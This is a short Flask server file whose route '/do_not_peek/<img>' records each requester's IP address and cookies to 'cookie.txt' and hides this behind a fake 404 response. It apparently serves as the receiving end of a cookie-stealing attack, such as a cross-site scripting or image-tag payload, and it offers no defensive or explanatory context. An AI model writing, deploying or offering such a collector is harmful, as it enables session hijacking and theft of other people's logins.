import io

from flask import Flask, request, send_file

app = Flask(__name__)


@app.route("/do_not_peek/<img>")
def job(img):
    #if request.remote_addr in ['111.199.102.53','47.254.28.30','127.0.0.1']:
    with open("cookie.txt", "a+") as f:
        f.write(str(request.remote_addr)+'-----'+str(request.cookies)+ "\n")
        #return send_file(img, mimetype='image/gif')
    return "404", 404


if __name__ == '__main__':
    app.run(host= '0.0.0.0')